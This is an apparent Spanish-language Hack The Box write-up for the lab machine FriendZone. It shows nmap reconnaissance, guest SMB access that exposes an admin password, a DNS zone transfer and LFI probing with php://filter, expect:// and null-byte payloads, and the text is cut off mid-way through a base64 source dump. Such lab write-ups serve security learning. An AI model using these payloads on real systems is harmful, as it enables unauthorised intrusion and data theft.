<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>            Hack The Box FriendZone - K4miyo      Ciberseguridad!      </title>
<meta name="description" content="Resolución de la máquina FriendZone en la plataforma de Hack The Box">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
<meta property="og:title" content="Hack The Box FriendZone">
<meta property="og:url" content="http://localhost:4000/htb-friendzone/">


  <meta property="og:description" content="Resolución de la máquina FriendZone en la plataforma de Hack The Box">



  <meta property="og:image" content="http://localhost:4000/assets/images/htb-friendzone/friendzone.jpg">





  <meta property="article:published_time" content="2021-12-12T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/htb-friendzone/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "K4miyo",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/">Home</a>
            </li>
<li class="masthead__menu-item">
              <a href="/year-archive/">Artículos</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories/">Categorías</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags/">Etiquetas</a>
            </li>
<li class="masthead__menu-item">
              <a href="/buscador/">Buscador</a>
            </li>
<li class="masthead__menu-item">
              <a href="/about/">Contacto</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1">
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">Hack The Box FriendZone</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">K4miyo</h3>
    
    
      <p class="author__bio" itemprop="description">
        Cyber Threat Intelligence Analyst
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      

      

      

      

      

      

      

      

      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box FriendZone">
    <meta itemprop="description" content="Resolución de la máquina FriendZone en la plataforma de Hack The Box">
    <meta itemprop="datePublished" content="December 12, 2021">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box FriendZone
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-12T00:00:00-06:00">December 12, 2021 </time> 
          
          
        </p>
        <p><img src="/assets/images/htb-friendzone/banner-friendzone.jpg" alt=""></p>

<h2 id="friendzone">FriendZone</h2>
<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.123.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.123
PING 10.10.10.123 <span class="o">(</span>10.10.10.123<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.10.123: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>146 ms

<span class="nt">---</span> 10.10.10.123 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
rtt min/avg/max/mdev <span class="o">=</span> 146.233/146.233/146.233/0.000 ms
</code></pre></div></div>

<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.123 <span class="nt">-oG</span> allPorts
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-05 22:49 CST
Initiating Ping Scan at 22:49
Scanning 10.10.10.123 <span class="o">[</span>4 ports]
Completed Ping Scan at 22:49, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating SYN Stealth Scan at 22:49
Scanning 10.10.10.123 <span class="o">[</span>65535 ports]
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Completed SYN Stealth Scan at 22:50, 35.56s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.10.123
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65528 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>35.88 seconds
           Raw packets sent: 68540 <span class="o">(</span>3.016MB<span class="o">)</span> | Rcvd: 68453 <span class="o">(</span>2.738MB<span class="o">)</span>

</code></pre></div></div>

<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
───────┬─────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────
   1   │ 
   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
   3   │ 
   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.123
   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,22,53,80,139,443,445
   6   │ 
   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
</code></pre></div></div>

<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,53,80,139,443,445 10.10.10.123 <span class="nt">-oN</span> targeted
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-12-05 22:51 CST
Nmap scan report <span class="k">for </span>10.10.10.123                              
Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>                                                                                                      
                                                                                                                                 
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3    
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:                                                  
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e <span class="o">(</span>ECDSA<span class="o">)</span>                                                                  
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>                                               
| dns-nsid:                                                     
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Friend Zone Escape software         
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
443/tcp open  ssl/http    Apache httpd 2.4.29
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>friendzone.red/organizationName<span class="o">=</span>CODERED/stateOrProvinceName<span class="o">=</span>CODERED/countryName<span class="o">=</span>JO
| Not valid before: 2018-10-05T21:02:30                                                                                          
|_Not valid after:  2018-11-04T21:02:30
| tls-alpn:         
|_  http/1.1          
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>  
|_http-title: 404 Not Found                                     
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
Service Info: Hosts: FRIENDZONE, 127.0.0.1<span class="p">;</span> OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: <span class="nt">-35m00s</span>, deviation: 1h09m16s, median: 4m58s
| smb-os-discovery: 
|   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6-Ubuntu<span class="o">)</span>
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE<span class="se">\x</span>00
|   Domain name: <span class="se">\x</span>00
|   FQDN: friendzone
|_  System <span class="nb">time</span>: 2021-12-06T06:56:24+02:00
| smb2-time: 
|   <span class="nb">date</span>: 2021-12-06T04:56:24
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>24.44 seconds
</code></pre></div></div>

<p>Vemos el puerto 21 abierto, así que podríamos tratar de ingresar como el usuario <code class="language-plaintext highlighter-rouge">anonymous</code>; sin embargo, tenemos que no se encuentra habilitado.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.123
Connected to 10.10.10.123.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.123:k4miyo<span class="o">)</span>: anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp&gt; <span class="nb">exit
</span>221 Goodbye.
</code></pre></div></div>

<p>Tenemos los puertos 80 y 443 asociados a los servicios HTTP y HTTPS, respectivamente; así que antes de visualizar el contenido vía web, vamos a hacer uso de la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code> para ver a lo que nos enfrentamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.123
http://10.10.10.123 <span class="o">[</span>200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.123], Title[Friend Zone Escape software]
❯ whatweb https://10.10.10.123
https://10.10.10.123 <span class="o">[</span>404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.123], Title[404 Not Found]
</code></pre></div></div>

<p>No vemos nada interesante como un gestor de contenido, así que vamos a visualizar el contenido vía web.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web.png" alt=""></p>

<p>Si observamos el puerto 443, tenemos que nos muestra un código de estado 404; por lo que podríamos estar pensando en que se está aplicando <em>virtual hosting</em>, así que vamos a agregar el dominio <code class="language-plaintext highlighter-rouge">friendzone.red</code> a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y ahora si podemos visualizar el contenido.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web1.png" alt=""></p>

<p>Por el momento no vemos algun panel de login o algo que nos pueda llamar la atención, así que vamos a ver el puerto 445, el cual está abierto, así que podríamos tratar de acceder con una null session y ver si tenemos permisos y bajo que recursos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.123
<span class="o">[</span>+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        print<span class="nv">$ </span>                                                 NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC<span class="nv">$ </span>                                                   NO ACCESS       IPC Service <span class="o">(</span>FriendZone server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
❯ smbclient <span class="nt">-L</span> 10.10.10.123 <span class="nt">-N</span>

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        print<span class="nv">$ </span>         Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC<span class="nv">$ </span>           IPC       IPC Service <span class="o">(</span>FriendZone server <span class="o">(</span>Samba, Ubuntu<span class="o">))</span>
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<p>Tenemos permisos de lectura bajo el directorio <code class="language-plaintext highlighter-rouge">general</code> y permisos de lectura y escritura bajo el directorio <code class="language-plaintext highlighter-rouge">Development</code>. Si le echamos un ojo al directorio <code class="language-plaintext highlighter-rouge">general</code> vemos que contiene un archivo llamado <code class="language-plaintext highlighter-rouge">creds.txt</code> que ya debe de llamarnos la atención; así que vamos a descargarlo a nuestra máquina de atacante.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.123 <span class="nt">-r</span> general
<span class="o">[</span>+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        general                                                 READ ONLY
        .<span class="se">\g</span>eneral<span class="se">\*</span>
        dr--r--r--                0 Wed Jan 16 14:10:51 2019    <span class="nb">.</span>
        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
        fr--r--r--               57 Tue Oct  9 18:52:42 2018    creds.txt
❯ smbmap <span class="nt">-H</span> 10.10.10.123 <span class="nt">--download</span> general/creds.txt
<span class="o">[</span>+] Starting download: general<span class="se">\c</span>reds.txt <span class="o">(</span>57 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/k4miyo/Documentos/HTB/FriendZone/nmap/10.10.10.123-general_creds.txt
❯ <span class="nb">cat </span>creds.txt
───────┬───────────────────────────────────────
       │ File: creds.txt
───────┼───────────────────────────────────────
   1   │ creds <span class="k">for </span>the admin THING:
   2   │ 
   3   │ admin:WORKWORKHhallelujah@#
</code></pre></div></div>

<p>Tenemos las credenciales del usuario <code class="language-plaintext highlighter-rouge">admin</code> que por el momento no sabemos en donde podríamos ocuparlas. Ahora, si checamos el contenido del directorio <code class="language-plaintext highlighter-rouge">Developtment</code>, vemos que no hay nada; sin embargo, debemos tener presente que tenemos permisos de escritura.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.123 <span class="nt">-r</span> Development
<span class="o">[</span>+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
        Development                                             READ, WRITE
        .<span class="se">\D</span>evelopment<span class="se">\*</span>
        dr--r--r--                0 Mon Dec  6 20:53:58 2021    <span class="nb">.</span>
        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
</code></pre></div></div>

<p>Ahora, tenemos el puerto 53 abierto, asociado al servicio de DNS; por lo que ya debemos estar pensando en un <strong><em>Domain Zone Transfer</em></strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ dig @10.10.10.123 friendzone.red
                                
<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.16.15-Debian &lt;&lt;<span class="o">&gt;&gt;</span> @10.10.10.123 friendzone.red
<span class="p">;</span> <span class="o">(</span>1 server found<span class="o">)</span>                                                                                                               
<span class="p">;;</span> global options: +cmd                                         
<span class="p">;;</span> Got answer:
<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: QUERY, status: NOERROR, id: 60525
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available                                                                                
                                
;; OPT PSEUDOSECTION:                                           
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: d8dd4fbbae8004ea53045f1761aed02d6b374f8ae4176943 (good)
;; QUESTION SECTION:                                            
;friendzone.red.                        IN      A
                                
;; ANSWER SECTION:                                              
friendzone.red.         604800  IN      A       127.0.0.1
                                
;; AUTHORITY SECTION:                                           
friendzone.red.         604800  IN      NS      localhost.

;; ADDITIONAL SECTION: 
localhost.              604800  IN      A       127.0.0.1
localhost.              604800  IN      AAAA    ::1
                                
;; Query time: 164 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: lun dic 06 21:03:31 CST 2021
;; MSG SIZE  rcvd: 154
❯ dig @10.10.10.123 friendzone.red axfr

; &lt;&lt;&gt;&gt; DiG 9.16.15-Debian &lt;&lt;&gt;&gt; @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 140 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: lun dic 06 21:03:43 CST 2021
;; XFR size: 8 records (messages 1, bytes 289)

❯ host -t axfr friendzone.red 10.10.10.123
Trying "friendzone.red"
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39055
;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzone.red.                        IN      AXFR

;; ANSWER SECTION:
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800

Received 250 bytes from 10.10.10.123#53 in 140 ms

</span></code></pre></div></div>

<p>Encontramos varios subdominios asociados al dominio principal <code class="language-plaintext highlighter-rouge">friendzone.red</code>; así que  vamos a copiarlos y agregarlos a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y posteriormente ver si contenido vía web.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web2.png" alt=""></p>

<p><img src="/assets/images/htb-friendzone/friendzone-web3.png" alt=""></p>

<p>Tenemos que los subdominios <code class="language-plaintext highlighter-rouge">administrator1.friendzone.red</code> y <code class="language-plaintext highlighter-rouge">uploads.friendzone.red</code> presentan contenido bajo el puerto 443. Si recordamos, tenemos unas credenciales, por lo que podríamos tratar de usarlas en el panel de login.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web4.png" alt=""></p>

<p>Al ingresar, nos dice que visitemos el recurso <code class="language-plaintext highlighter-rouge">/dashboard.php</code>.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web5.png" alt=""></p>

<p>De lo observamos, nos indica que existen los parámetros <code class="language-plaintext highlighter-rouge">imagen_id</code> y <code class="language-plaintext highlighter-rouge">pagename</code>; como ejemplo debemos colocar lo siguiente:  <code class="language-plaintext highlighter-rouge">image_id=a.jpg&amp;pagename=timestamp</code>.</p>

<p><img src="/assets/images/htb-friendzone/friendzone-web6.png" alt=""></p>

<p>A este punto vemos algo curioso, el parámetro <code class="language-plaintext highlighter-rouge">pagename</code> el cual nos hace pensar que podemos listar recursos de la máquina, es decir, <strong><em>LFI - Local File Inclusion</em></strong>; por lo que podríamos tratar de ver un recurso interno.</p>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=/etc/passwd</code> - No vemos nada</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=/etc/hosts</code> - No vemos nada</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=dashboard.php</code> - No vemos nada</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=dashboard</code> - Vemos que se interpreta el código php asociado al archivo <code class="language-plaintext highlighter-rouge">dashboard</code>.</li>
</ul>

<p><img src="/assets/images/htb-friendzone/friendzone-web7.png" alt=""></p>

<p>Con esto, podemos pensar que con el parámetro <code class="language-plaintext highlighter-rouge">pagename</code> podemos visualizar archivos php; por lo que podríamos utilizar wrappers para ver archivos del sistema:</p>

<ul>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=/etc/passwd%00</code> - No vemos nada.</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=expect://ls</code> - No vemos nada.</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=php://filter/resource=/etc/passwd</code> -  No vemos nada.</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=php://filter/convert.base64-encode/resource=/etc/passwd</code> - No vemos nada.</li>
  <li>
<code class="language-plaintext highlighter-rouge">pagename=php://filter/convert.base64-encode/resource=timestamp</code> - Tenemos una cadena en base 64 del archivo php <code class="language-plaintext highlighter-rouge">timestamp.php</code>
</li>
</ul>

<p><img src="/assets/images/htb-friendzone/friendzone-web8.png" alt=""></p>

<p>Copiamos la cadena y la decodificamos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo="</span> | <span class="nb">base64</span> <span class="nt">-d</span>

&lt;?php


<span class="nv">$time_final</span> <span class="o">=</span> <span class="nb">time</span><span class="o">()</span> + 3600<span class="p">;</span>

<span class="nb">echo</span> <span class="s2">"Final Access timestamp is </span><span class="nv">$time_final</span><span class="s2">"</span><span class="p">;</span>


?&gt;

</code></pre></div></div>

<p>Ya vemos el archivo <code class="language-plaintext highlighter-rouge">timestamp.php</code> y de igual forma, podríamos tratar de ver el archivo <code class="language-plaintext highlighter-rouge">dashboard.php</code> y para el subdominio <code class="language-plaintext highlighter-rouge">uploads.friendzone.red</code> ver el archivo <code class="language-plaintext highlighter-rouge">upload.php</code>.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">pagename=php://filter/convert.base64-encode/resource=dashboard</code></li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span><span class="p">;</span> <span class="nb">echo</span> <span class="s2">"PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGF